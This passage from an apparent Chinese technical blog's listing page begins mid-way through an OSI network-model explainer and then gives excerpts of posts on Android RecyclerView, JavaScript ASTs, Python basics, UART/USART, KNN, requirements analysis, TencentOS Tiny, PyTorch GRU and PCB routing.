定义：如何让格式化数据以进行传输，以及如何让控制对物理介质的访问，这一层通常还提供错误检测和纠正，以确保数据的可靠传输。
在链路层，信息以帧(frame)为单位传输。在帧中，有收信地址(Source, SRC)和送信地址(Destination, DST)，还有能够探测错误的校验序列(Frame Check Sequence)。当然，帧中最重要的最重要是所要传输的数据 (payload)。帧中最重要的最重要是所要传输的数据 (payload)。这些数据往往符合更高层协议，供网络的上层使用。
三、网络层（network layer）邮编（邮局）
这层对端到端的包传输进行定义，它定义了能够标识所有结点的逻辑地址，还定义了路由实现的方式和学习的方式。为了适应最大传输单元长度小于包长度的传输介质，网络层还定义了如何将一个包分解成更小的包的分段方法。
定义：在位于不同地理位置的网络中的两个主机系统之间提供连接和路径选择，Internet的发展使得从世界各站点访问信息的用户数大大增加，而网络层正是管理这种连接的层。
让WiFi上的一台计算机和以太网上的另一台计算机通信呢？我们需要一个“中间人“：路由器。路由器有多个网卡(NIC，Network Interface Controller)，每个NIC可以接入多个网络，并理解相应的连接层协议。在帧经过路由到达另一个网络的时候，路由会读取帧的信息，并改写以发送到另一个网络。所以路由器就像是在两个社区都有分支的邮局。所以邮局要求，信纸上写的地址必须是一个符合官方规定的“邮编”，也就是IP地址。每个邮局一般连接多个社区，而一个社区也可以有多个邮局，分别通往不同的社区。有时候一封信要通过多个邮局转交，才能最终到达目的地，这个过程叫做route。邮局将分离的局域网络连接成了internet，并最终构成了覆盖全球的互联网。
四、传输层（transport layer）收信人（管理员）
上面的三层协议让不同的计算机之间可以通信。但计算机中实际上有许多个进程，每个进程都可能有通信的需求。传输层协议，比如TCP和UDP，使用端口号(port number)来识别收信人(某个进程)。在写信的时候，我们写上目的地的端口。当信到达目的地的管理员手中，他会根据传输层协议，识别端口号，将信送给不同的人。
定义：定义了一些传输数据的协议和端口号（WWW端口80等），如：TCP（传输控制协议，传输效率低，可靠性强，用于传输可靠性要求高，数据量大的数据），UDP（用户数据报协议，与TCP特性恰恰相反，用于传输可靠性要求不高，数据量小的数据，如QQ聊天数据就是通过这种方式传输的）， 主要是将从下层接收的数据进行分段和传输，到达目的地址后再进行重组，常常把这一层数据叫做段。
TCP和UDP协议是两种不同的传输层协议。UDP协议类似于我们的信件交流过程。TCP协议则好像两个情人间的频繁通信。一个小情人要表达的感情太多，以致于连续写了好几封信。而另一方必须将这些信按顺序排列起来，才能看明白全部的意思。TCP协议还有控制网络交通等功能。
五、会话层
它定义了如何开始、控制和结束一个会话，包括对多个双向消息的控制和管理，以便在只完成连续消息的一部分时可以通知应用，从而使表示层看到的数据是连续的，在某些情况下，如果表示层收到了所有的数据，则用数据代表表示层。
六、表示层
这一层的主要功能是定义数据格式及加密。例如，FTP允许你选择以二进制或ASCII格式传输。如果选择二进制，那么发送方和接收方不改变文件的内容。如果选择ASCII格式，发送方将把文本从发送方的字符集转换成标准的ASCII后发送数据。在接收方将标准的ASCII转换成接收方计算机的字符集。 七、应用层（application layer）收信人地址（行业用语规范）
定义：是最靠近用户的OSI层，这一层为用户的应用程序（例如电子邮件、文件传输和终端仿真）提供网络服务。
通过上面的几层协议，我们已经可以在任意两个人(进程)之间进行通信。然而每个人实际上从事的是不同的行业。有的人是律师，有的人外交官。比如说律师之间的通信，会用严格的律师术语，以免产生纠纷。再比如外交官之间的通信，必须符合一定的外交格式，以免发生外交误会。再比如间谍通过暗号来传递加密信息。应用层协议是对信件内容进一步的用语规范。应用层的协议包括用于Web浏览的HTTP协议，用于传输文件的FTP协议，用于Email的IMAP等等。
把通信的过程比喻为寄快递：
发快递的过程（http，应用层)，你向顺丰下单(第一次请求),顺丰接单(应答),你向手机小伙联系(回应应答)，你将消息放进盒子里(开始封装请求，会话层)，快递员封装一层盒子贴上快递单带回网店(传输层），到快递点检查是否区域快件（网络层），将快件交给运输车（链路层），各个快递转运中心（物理层），快件到达收件市转运中心（物理层），转运输车（链路层），到达区域分发（网络层），网点派送（传输层），快递员方面签收（会话层），拆开检查（表示层），收到快递（应用层）。
各层协议种类
物理层：
以太网物理层 、调制解调器 、 PLC 、SONET/SDH 、G.709、光导纤维、同轴电缆 、 双绞线
数据链路层：
Wi-Fi 、以太网、802.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2045407d42416bba945662016090eca5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b2ff759f5968a470715b0148aeae64a2/" rel="bookmark">
			RecyclerView如何嵌套RecyclerView
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linearlayoutmanager RecyclerView嵌套GridLayoutManager RecyclerView
布局方式:以一个GridLayoutManager的recyclerview作为Linearlayoutmanager RecyclerView的itemview
MainRecyclerAdapter.java
public class MainRecyclerAdapter extends RecyclerView.Adapter&lt;MainRecyclerAdapter.ViewHolder&gt; { @Override public ViewHolder onCreateViewHolder(ViewGroup parent, int viewType) { View view = LayoutInflater.from(parent.getContext()).inflate(R.layout.item_view_main, parent, false); return new ViewHolder(view); } @Override public void onBindViewHolder(ViewHolder holder, int position) { holder.mButton.setText("Item " + position); if(holder.mRecyclerView.getAdapter()==null) { holder.mRecyclerView.setAdapter(new GridAdapter()); }/*else { holder.mRecyclerView.getAdapter().notifyDataSetChanged(); }*/ } @Override public int getItemCount() { return 10; } public static class ViewHolder extends RecyclerView.ViewHolder { public final AppCompatButton mButton; public final RecyclerView mRecyclerView; public ViewHolder(View itemView) { super(itemView); mButton = (AppCompatButton) itemView.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b2ff759f5968a470715b0148aeae64a2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a09ce77070e627507e5fd5589f329e1d/" rel="bookmark">
			抽象语法书AST
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		抽象语法树（AST），是一个非常基础而重要的知识点，但国内的文档却几乎一片空白。 本文将带大家从底层了解AST,并且通过发布一个小型前端工具，来带大家了解AST的强大功能
Javascript就像一台精妙运作的机器，我们可以用它来完成一切天马行空的构思。
我们对javascript生态了如指掌，却常忽视javascript本身。这台机器，究竟是哪些零部件在支持着它运行？
AST在日常业务中也许很难涉及到，但当你不止于想做一个工程师，而想做工程师的工程师，写出vue、react之类的大型框架，或类似webpack、vue-cli前端自动化的工具，或者有批量修改源码的工程需求，那你必须懂得AST。AST的能力十分强大，且能帮你真正吃透javascript的语言精髓。
事实上，在javascript世界中，你可以认为抽象语法树(AST)是最底层。 再往下，就是关于转换和编译的“黑魔法”领域了。
人生第一次拆解Javascript 小时候，当我们拿到一个螺丝刀和一台机器，人生中最令人怀念的梦幻时刻便开始了：
我们把机器，拆成一个一个小零件，一个个齿轮与螺钉，用巧妙的机械原理衔接在一起...
当我们把它重新照不同的方式组装起来，这时，机器重新又跑动了起来——世界在你眼中如获新生。
通过抽象语法树解析，我们可以像童年时拆解玩具一样，透视Javascript这台机器的运转，并且重新按着你的意愿来组装。
现在，我们拆解一个简单的add函数
function add(a, b) { return a + b } 首先，我们拿到的这个语法块，是一个FunctionDeclaration(函数定义)对象。
用力拆开，它成了三块：
一个id，就是它的名字，即add两个params，就是它的参数，即[a, b]一块body，也就是大括号内的一堆东西 add没办法继续拆下去了，它是一个最基础Identifier（标志）对象，用来作为函数的唯一标志，就像人的姓名一样。
{ name: 'add' type: 'identifier' ... } params继续拆下去，其实是两个Identifier组成的数组。之后也没办法拆下去了。
[ { name: 'a' type: 'identifier' ... }, { name: 'b' type: 'identifier' ... } ] 接下来，我们继续拆开body
我们发现，body其实是一个BlockStatement（块状域）对象，用来表示是{return a + b}
打开Blockstatement，里面藏着一个ReturnStatement（Return域）对象，用来表示return a + b
继续打开ReturnStatement,里面是一个BinaryExpression(二项式)对象，用来表示a + b
继续打开BinaryExpression，它成了三部分，left，operator，right
operator 即+left 里面装的，是Identifier对象 aright 里面装的，是Identifer对象 b 就这样，我们把一个简单的add函数拆解完毕，用图表示就是
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a09ce77070e627507e5fd5589f329e1d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3fa4e87e19772b263b19edcaf2409c46/" rel="bookmark">
			python学习笔记（一）Python 简单介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python学习笔记（一）Python 简单介绍 Python介绍Python简介Python应用领域 Python是解释型的语⾔编译和解释的区别是什么？编译型vs解释型编译型解释型 Python的优缺点优点缺点单行语句和命令行输出问题独特的语法运行速度慢 Python开发环境IDLEPyCharmKomodo和Komodo Editeclipse+pydev插件 Python解释器CPythonIPythonPyPyJythonIronPythonZhPy python发展历程Python 2 和 Python 3Python的下载与安装注释单行注释多行注释 输入输出第⼀个Python程序 Python介绍 Python简介 Python是一种跨平台的计算机程序设计语言。 是一个高层次的结合了解释性、编译性、互动性和面向对象的脚本语言。最初被设计用于编写自动化脚本(shell)，随着版本的不断更新和语言新功能的添加，越多被用于独立的、大型项目的开发。
Python是完全面向对象的语言。函数、模块、数字、字符串都是对象。并且完全支持继承、重载、派生、多继承，有益于增强源代码的复用性。Python支持重载运算符和动态类型。
Python应用领域 Web 和 Internet开发
科学计算和统计
人工智能
桌面界面开发
软件开发
后端开发
网络爬虫
Python是解释型的语⾔ 编译和解释的区别是什么？ 编译器是把源程序的每⼀条语句都编译成机器语⾔,并保存成⼆进制⽂件,这样运⾏时计算机可以直接以机器语⾔来运⾏此程序,速度很快;⽽解释器则是只在执⾏程序时,才⼀条⼀条的解释成机器语⾔给计算机来执⾏,所以运⾏速度是不如编译后的程序运⾏的快的.这是因为计算机不能直接认识并执⾏我们写的语句,它只能认识机器语⾔(是⼆进制的形式)
编译型解释型混合型C/C++JavaScriptJAVAGOPythonC#PascalPHPSwiftPerl 编译型vs解释型 编译型 优点：编译器⼀般会有预编译的过程对代码进⾏优化。因为编译只做⼀次，运⾏时不需要编译，所以编译型语⾔的程序执⾏效率⾼。可以脱离语⾔环境独立运⾏。
缺点：编译之后如果需要修改就需要整个模块重新编译。编译的时候根据对应的运⾏环境⽣成机器码，不同的操作系统之间移植就会有问题，需要根据运⾏的操作系统环境编译不同的可执⾏⽂件。
解释型 优点：有良好的平台兼容性，在任何环境中都可以运⾏，前提是安装了解释器（虚拟机）。
灵活，修改代码的时候直接修改就可以，可以快速部署，不⽤停机维护。
缺点：每次运⾏的时候都要解释⼀遍，性能上不如编译型语⾔。
Python的优缺点 优点 简单：Python是一种代表简单主义思想的语言。阅读一个良好的Python程序就感觉像是在读英语一样。它使你能够专注于解决问题而不是去搞明白语言本身。易学：Python极其容易上手，因为Python有极其简单的说明文档。 速度快：Python 的底层是用 C
语言写的，很多标准库和第三方库也都是用 C 写的，运行速度非常快。免费、开源：Python是FLOSS（自由/开放源码软件）之一。使用者可以自由地发布这个软件的拷贝、阅读它的源代码、对它做改动、把它的一部分用于新的自由软件中。FLOSS是基于一个团体分享知识的概念。可移植性：由于它的开源本质，Python已经被移植在许多平台上。解释性：Python语言写的程序不需要编译成二进制代码。你可以直接从源代码运行程序。在计算机内部，Python解释器把源代码转换成称为字节码的中间形式，然后再把它翻译成计算机使用的机器语言并运行。这使得使用Python更加简单。也使得Python程序更加易于移植。面向对象：Python既支持面向过程的编程也支持面向对象的编程。在“面向过程”的语言中，程序是由过程或仅仅是可重用代码的函数构建起来的。在“面向对象”的语言中，程序是由数据和功能组合而成的对象构建起来的。可扩展性：如果需要一段关键代码运行得更快或者希望某些算法不公开，可以部分程序用C或C++编写，然后在Python程序中使用它们。可嵌入性：可以把Python嵌入C/C++程序，从而向程序用户提供脚本功能。丰富的库：Python标准库确实很庞大。它可以帮助处理各种工作，包括正则表达式、文档生成、单元测试、线程、数据库、网页浏览器、CGI、FTP、电子邮件、XML、XML-RPC、HTML、WAV文件、密码系统、GUI（图形用户界面）、Tk和其他与系统有关的操作。这被称作Python的“功能齐全”理念。除了标准库以外，还有许多其他高质量的库，如wxPython、Twisted和Python图像库等等。规范的代码：Python采用强制缩进的方式使得代码具有较好可读性。而Python语言写的程序不需要编译成二进制代码。 缺点 单行语句和命令行输出问题 很多时候不能将程序连写成一行，如import sys;for i in sys.path:print i。而perl和awk就无此限制，可以较为方便的在shell下完成简单程序，不需要如Python一样，必须将程序写入一个.py文件。
独特的语法 这也许不应该被称为局限，但是它用缩进来区分语句关系的方式还是给很多初学者带来了困惑。即便是很有经验的Python程序员，也可能陷入陷阱当中。
运行速度慢 这里是指与C和C++相比。
Python开发环境 IDLE Python内置IDE (随python安装包提供)
PyCharm PyCharm，由著名的JetBrains公司开发，带有一整套可以帮助用户在使用Python语言开发时提高其效率的工具，比如调试、语法高亮、Project管理、代码跳转、智能提示、自动完成、单元测试、版本控制。此外，该IDE提供了一些高级功能，以用于支持Django框架下的专业Web开发。
Komodo和Komodo Edit 后者是前者的免费精简版 Spyder：安装Anaconda自带的高级IDE
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3fa4e87e19772b263b19edcaf2409c46/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1062b6a3042547b9fb59ba49d8336a0b/" rel="bookmark">
			UART与USART区别  (串口同步通信和异步通信)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		UART的同步通信和异步通信
https://blog.csdn.net/chipsea_mltsum/article/details/83897924
STM32-USART同步异步串行通讯
https://wenku.baidu.com/view/fbd1844ad5d8d15abe23482fb4daa58da1111ccc.html
UART和USART有区别 https://blog.csdn.net/wofreeo/article/details/100066791
uart与usart区别 https://www.cnblogs.com/coolyouguo/p/10449626.html
uart和usart的区别 UART与USART都是单片机上的串口通信，他们之间的区别如下：
首先从名字上看：
UART：universal asynchronous receiver and transmitter通用异步收/发器
USART:universal synchronous asynchronous receiver and transmitter通用同步/异步收/发器
从名字上可以看出，USART在UART基础上增加了同步功能，即USART是UART的增强型，事实也确实是这样。但是具体增强到了什么地方呢？
其实当我们使用USART在异步通信的时候，它与UART没有什么区别，但是用在同步通信的时候，区别就很明显了：大家都知道同步通信需要时钟来触发数据传输，也就是说USART相对UART的区别之一就是能提供主动时钟。如STM32的USART可以提供时钟支持ISO7816的智能卡接口。
UART与USART区别 一. 硬件设计
USART：通用同步和异步收发器
UART：通用异步收发器
当进行异步通信时,这两者是没有区别的。区别在于USART比UART多了同步通信功能。
这个同步通信功能可以把USART当做SPI来用，比如用USART来驱动SPI设备。
其中SPI IIC为同步通信 UART为异步通信, usart为同步&amp;异步通信。
二. 软件设计也存在同步发送和异步发送的区别:
同步是指：发送方发出数据后，等接收方发回响应以后才发下一个数据包的通讯方式。 异步是指：发送方发出数据后，不等接收方发回响应，接着发送下个数据包的通讯方式。
同步是阻塞模式，异步是非阻塞模式。
三. 单工\半双工\全双工
单工、半双工、全双工 单工数据传输只支持数据在一个方向上传输； 半双工数据传输允许数据在两个方向上传输，但是，在某一时刻，只允许数据在一个方向上传输，它实际上是一种切换方向的单工通信； 全双工数据通信允许数据同时在两个方向上传输，因此，全双工通信是两个单工通信方式的结合，它要求发送设备和接收设备都有独立的接收和发送能力。
I2C是半双工，SPI的全双工，uart是全双工。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95da4d973f17541e8b937e078e451ee0/" rel="bookmark">
			Python Knn算法详解（近邻算法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		KNN 一、算法简述二、运行原理2.1、算法核心思想2.2、距离计算2.3、K值选择 三、算法实现3.1、Sklearn KNN参数概述3.2、 KNN代码实例 四、算法特点五、算法优缺点六、KNN 和 K-means比较 一、算法简述 KNN 可以说是最简单的分类算法之一，同时，它也是最常用的分类算法之一。注意：KNN 算法是有监督学习中的分类算法，它看起来和另一个机器学习算法 K-means 有点像（K-means 是无监督学习算法），但却是有本质区别的。
二、运行原理 2.1、算法核心思想 KNN 的全称是 K Nearest Neighbors，意思是 K 个最近的邻居。从这个名字我们就能看出一些 KNN 算法的蛛丝马迹了。K 个最近邻居，毫无疑问，K 的取值肯定是至关重要的，那么最近的邻居又是怎么回事呢？其实，KNN 的原理就是当预测一个新的值 x 的时候，根据它距离最近的 K 个点是什么类别来判断 x 属于哪个类别。听起来有点绕，还是看看图吧。
图中绿色的点就是我们要预测的那个点，假设 K=3。那么 KNN 算法就会找到与它距离最近的三个点（这里用圆圈把它圈起来了），看看哪种类别多一些，比如这个例子中是蓝色三角形多一些，新来的绿色点就归类到蓝三角了。
但是，当 K=5 的时候，判定就变成不一样了。这次变成红圆多一些，所以新来的绿点被归类成红圆。从这个例子中，我们就能看得出 K 的取值是很重要的。
明白了大概原理后，我们就来说一说细节的东西吧，主要有两个，K 值的选取和点距离的计算。
2.2、距离计算 要度量空间中点距离的话，有好几种度量方式，比如常见的曼哈顿距离计算、欧式距离计算等等。不过通常 KNN 算法中使用的是欧式距离。这里只是简单说一下，拿二维平面为例，二维空间两个点的欧式距离计算公式如下：
这个高中应该就有接触到的了，其实就是计算（x1,y1）和（x2,y2）的距离。拓展到多维空间，则公式变成这样：
这样我们就明白了如何计算距离。KNN 算法最简单粗暴的就是将预测点与所有点距离进行计算，然后保存并排序，选出前面 K 个值看看哪些类别比较多。但其实也可以通过一些数据结构来辅助，比如最大堆，这里就不多做介绍，有兴趣可以百度最大堆相关数据结构的知识。
2.3、K值选择 通过上面那张图我们知道 K 的取值比较重要，那么该如何确定 K 取多少值好呢？答案是通过交叉验证（将样本数据按照一定比例，拆分出训练用的数据和验证用的数据，比如6：4拆分出部分训练数据和验证数据），从选取一个较小的 K 值开始，不断增加 K 的值，然后计算验证集合的方差，最终找到一个比较合适的 K 值。
通过交叉验证计算方差后可以得到一个有一定趋向的线图，然后通过观察找到最适合的k值。
当你增大 K 的时候，一般错误率会先降低，因为有周围更多的样本可以借鉴了，分类效果会变好。但注意，和 K-means 不一样，当 K 值更大的时候，错误率会更高。这也很好理解，比如说你一共就35个样本，当你 K 增大到30的时候，KNN 基本上就没意义了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/95da4d973f17541e8b937e078e451ee0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6de887b0a7da404e892d97e782cac8c3/" rel="bookmark">
			软件工程导论 —— 软件需求分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 软件工程导论 —— 软件需求分析 一、填空题 结构化分析方法的策略是：自动向下逐层分解需求分析过程包括需求获取、需求提炼、需求描述和需求验证四个步骤数据流图中描述加工逻辑一般使用三种工具，分别是：结构化语言、判定树、判定表需求分析阶段产生的最重要文档是：需求规格说明书数据流图的信息流可分为变换性和事务性两种类型变换性数据流图基本呈现型形状的结构，由输入、变换和输出组成在画分层的DFD时，父图和子图的输入输出数据流要平衡软件需求分析方法包括功能分解法、结构化分析法、信息建模发和面向对象分析法数据流图中的每一个加工至少有一个输入数据流数据流图汇中的箭头白搜狐数据流在结构化分析方法中，数据流图和数据字典共同构成系统的逻辑模型层次方图是需求分析阶段用来描述数据的图形工具 二、名词解释 结构化分析：面向数据流的分析方法，是使用数据流图、数据字典、结构化语言、判定树、判定表等工具，来建立一种新的成为结构化说明书的目标文档软件需求分析：软件需求分析是整个系统开发的基础。在此阶段结束前，系统分析员应该写出软件需求规格说明书，以书面的形式准确的描述软件需求、数据流图（DFD）：是SA方法中用于表示系统逻辑模型的一种工具，它以直观的图形清晰的描述了系统数据的流动和处理过程数据字典（DD）：数据字典是关于数据的信息的集合，也就是对数据流图中所包含元素的定义的集合 三、简答题 简述需求分析的常用方法。
功能分解法结构化分析法面向对象方法信息建模法 需求分析的基本任务是什么
确定对系统的综合需求分析系统的数据需求建立软件的逻辑模型编写软件需求规格说明书需求分析评审 需求分析的步骤
需求获取：研究调查需求提炼：分析建模需求描述：编写SRS需求验证 怎样理解分析阶段的任务是“做什么”而不是“怎么做”
​ 需求分析实际上就是调查、评价及肯定用户对软件需求的过程，其目的在于精化软件的作用范围，也是分析和确认软线系统构成的过程，以确定未来系统的主要成分及它们之间接口的描述。因此，需求分析实际上是一种对用户意图的不断揭示和判断的过程，它并不考虑系统的具体实现，而是完整的，严密地描述应当做什么的过程
什么是数据流图？他的作用是什么？其中的基本符号表示的什么含义？
数据流图是SA方法中用来表示系统逻辑模型的一种工具它描述系统由那几个部分组成，各部分之间的联系等，以直观的图形清晰的描述了系统数据的流动和处理过程箭头表示数据流；圆或椭圆表示变换数据的处理；方框表示数据的源点或终点；双杠或单杠表示数据存储 简述绘制数据流图的步骤
第一步：先找外部实体（可以是人、物、或其他软件系统）。找到外部实体，则系统与外部世界的界面得以确定，系统的源点和终点也就找到了第二步：找出外部实体的输入和输出数据流第三步：在图的边上画出系统的外部实体第四步：从外部实体的输出流（源点）触发按照系统的逻辑需要，逐步画出一系列变换数据加工，直到找到外部实体出所需的输入流（终点），形成数据流的封闭第五步：按照上述原则进行检查和修改，父图步骤与子图一致 什么是数据字典？作用是什么？它有哪些条目？
数据字典是对数据流图中包含元素的定义集合数据字典的作用正是在软件分析和设计的过程中，给人提供数据描述，即对数据存储和加工等名字进行定义数据流、数据流分量（数据基本项）、数据存储和加工 简述半形式化的结构化分析描述工具
数据流图：是一种描述“分解”的结构化过程建模工具，它描述系统由那几个部分组成，各部分之间的联系等数据字典：是关于数据的信息的集合，用来定义数据流图中的数据和加工，对数据流图中包含的所有元素的定义的汇集描述加工逻辑的结构化语言、判定树、判定表：数据流图中的不能被再分解的每一个基本加工处理逻辑的详细描述采用结构化语言，判定表和判定树 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/caef7b47070a90dcbc9990bba0e50d47/" rel="bookmark">
			国产开源IoTOS：腾讯物联网操作系统TencentOS Tiny的探索与实践
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		导语 | 腾讯物联网终端操作系统（TencentOS tiny）是腾讯面向物联网领域自主研发的嵌入式实时操作系统，可助力物联网终端设备及业务快速接入腾讯云物联网平台。本文是对腾讯高级工程师汪礼超、赵健在云＋社区 online 分享的整理，为大家介绍 TencentOS Tiny 操作系统开源过程中技术架构的探索、演进和实践。
一、物联网操作系统浪潮
1. 物联网行业的浪潮 2009年温家宝总理在无锡提出感知中国的战略，无锡率先建立了感知中国研究中心，多所大学在无锡建立了物联网研究院，物联网也正式列入了十一届人大三次会议的政府工作报告，在这之后物联网受到极大的关注。
2016年以来随着低功耗广域物联网技术的推出，物联网开始呈现井喷式的发展，真正铺开面，实现了广域大范围的连接。根据权威数据统计，国内物联网市场份额在2018年就已经达到了1.3万亿，而2020年这一数字提升到了1.8万亿。
物联网在智能家居、生活物联、公共事业、智能能源等多个垂直行业都得到了广泛的应用，相比互联网时代，物联网通讯协议更加多样化，物的碎片化也更严重，统一连接和接入标准的重要性也由此凸显开来。
如何把不同的物体信息搜集整合起来并把它传输到下一个层次？思考这一点时，会遇到非常多的问题，比如功耗以及资源的控制、组网的互通等等。
在这样的需求下，面向物联网的设备和应用需要一个集成系统，通过它们完成底层数据的搜集，由此整个物联网操作系统的市场需求开始爆发了。
现在单一的软件结构很难解决这些问题，成熟的物联网设备采集数据，包括云端互联都需要操作系统支持，而针对不同的业务与应用，需求也不一样。面临实际应用场景我们需要针对不同的行业定制软件方案，所以IoT需要专门的定制系统来解决这类问题。
正是有了这样的庞大的物联网市场需求，各大互联网公司开始了自家的物联网生态布局，掀起了物联网操作系统开源的浪潮。
根据目前的数据，华为在早期时候布局了"1+2+1"的物联网战略，也基于自家芯片和业务打造了物联网操作系统，2015年他们宣布LiteOS开源。阿里同样基于公司全栈的生态链进行物联网操作系统打造，并于2017年开源了阿里的物联网操作系统AliOS-Things。睿赛德科技也主导开发了一款知名的国产实时物联网操作系统RT-Thread，问世十年，也有很大的装机量，同时，2020年，中移动也发布了OneOS物联网操作系统并开源，助力设备接入移动云服务。
放眼海外，物联网操作系统也备受关注，比如2017年12月份亚马逊收购了FreeRTOS，并基于FreeRTOS 内核，增加了重要的AWS 支持和 IoT使用案例支持，全面进军物联网生态。2019年4月18日，微软宣布收购了Express Logic公司，其目标是让ThreadX 实时物联网操作系统成为Azure 云上的选项，希望能够增加无缝连接Azure云服务的设备数量，同时，风河的VxWorks、silicon的UCOS、ARM的mbedOS等老牌RTOS也占据了一定的市场，举足轻重。
物联网操作系统的浪潮吹来，很多人也开始讨论：操作系统到底哪家强？其实站在我的角度来看，大家没必要过多比较哪个操作系统更强，符合业务需求才是最合适的。
2. 浪潮之巅，国产 IoTOS 如何探索？ 一款优秀的物联网操作系统，不单单要有技术上的优势，还要契合用户的需求，做到与开发者共建生态。而共建生态的重要性也不需要多说了，大家可以倒推几十年，看看桌面和手机操作系统从百花齐放到最后综合成少数几个用户生态。所以生态能否成功，是操作系统能否发展好的关键之处。
好的操作系统是开发者和用户用出来的，物联网操作系统要形成良好生态，首先技术上要有优势，比如做到物联网代码更简捷、功耗更低，避免做出的功能用户不需要。
另外还要结合用户对不同物联产品的需求做针对开发，尽量使技术符合生态、用户需求，持续地做出商业价值。
无论是从生态打造，还是从技术角度出发，都需要落地到实际生活中，才能够有效解决实际问题，这些才是物联网操作系统的核心竞争力。通过开发者需求和生态逐步迭代，逐步实现商业价值，这样的路线才是在浪潮之巅服务好IoT行业的优秀操作系统所应该布局的。
3. 拥抱浪潮，腾讯物联网操作系统的产品布局 针对行业发展的浪潮，腾讯在物联网领域也有完整的物联网布局，覆盖了多个维度，产品能力支持消费物联、智慧城市、教育、医疗、工业、支付、政务等等多垂直行业，也推出腾讯物联网通信平台和开发平台，还有腾讯连连等一系列云上的服务，旨在提供安全稳定的连接平台，帮助开发者低成本的快速实现设备与设备间的互联。
同时，物联网平台也支持主流的物联网协议接入。其中，TencentOS Tiny服务于低资源、低功耗的物联网终端节点，是整个物联网生态链底层重要的一环，我们希望通过技术开源和生态协同，做好生态链底层这一环，从而完善IoT端到端解决方案，实现终端设备的互联互通，为云上海量数据平台引流，服务好 IoT 生态链中的客户差异性需求，推动整个IoT产业的发展。
二、TencentOS Tiny 产品架构及核心技术
1. 产品架构 上图是整个 TencentOS Tiny 的产品架构，由下往上看，最下面是目前已经支持的 MCU 芯片和模组，其中包括 STM32 和主流的蜂窝通信模组，提供了驱动框架和外设框架，兼容不同硬件和方便适配不同硬件平台。
再往上面是TencentOS Tiny的核心基础内核，再上面是物联网所需要的联网组件（这里下文会详细展开），提供了 IoT 常用的功能组件，比如文件系统、KV存储和高级语言引擎框架等等，提供了方便用户调用的业务层API，业务层上也会提供常用的案例供客户和开发者参考。
除此以外，此架构内置了安全框架，为终端设备的设备唯一标识、通信链路加密、密钥安全存储提供了保障，防止物联网设备被攻击。
总结一下，整个TencentOS Tiny物联网操作系统有三个特点：
第一，极至精简的内核。内核整体代码量不超过一万行，能够实现超低资源的占用，IDLE任务下，最小资源占用仅为0.6KBRAM，1.8KB ROM
第二，功耗低，最小休眠功耗可以达到 uA 级别。
第三，软件架构非常简捷，方便嵌入式开发者以超快的速度入门，只需要把操作系统快速移植上去，上面的IoT组件就可以直接使用，非常方便，不需花太多时间成本学习。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/caef7b47070a90dcbc9990bba0e50d47/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb0ea31f0642c3999ba5f21f4481574f/" rel="bookmark">
			torch.nn.GRU的输入及输出示例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们有时会看到GRU中输入的参数有时是一个，但是有时又有两个。这难免会让人们感到疑惑，那么这些参数到底是什么呢。
一、输入到GRU的参数 输入的参数有两个，分别是input和h_0。
Inputs: input, h_0
①input的shape The shape of input:(seq_len, batch, input_size) : tensor containing the feature of the input sequence. The input can also be a packed variable length sequence。See functorch.nn.utils.rnn.pack_padded_sequencefor details.
②h_0的shape 从下面的解释中也可以看出，这个参数可以不提供，那么就默认为0.
The shape of h_0:(num_layers * num_directions, batch, hidden_size): tensor containing the initial hidden state for each element in the batch. Defaults to zero if not provided. If the RNN is bidirectional num_directions should be 2, else it should be 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bb0ea31f0642c3999ba5f21f4481574f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/787ba3116bbe4d354a8542ef04c25ec6/" rel="bookmark">
			kicad最小布线宽度默认是多少_PCB布线设计，提高有一套完整的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PCB布线设计中，对于布通率的的提高有一套完整的方法，在此，我们为大家提供提高PCB设计布通率以及设计效率的有效技巧，不仅能为客户节省项目开发周期，还能最大限度的保证设计成品的质量。
电路板尺寸和布线层数需要在设计初期确定。如果设计要求使用高密度球栅数组（BGA）组件，就必须考虑这些器件布线所需要的最少布线层数。布线层的数量以及层叠（stack-up）方式会直接影响到印制线的布线和阻抗。板的大小有助于确定层叠方式和印制线宽度，实现期望的设计效果。
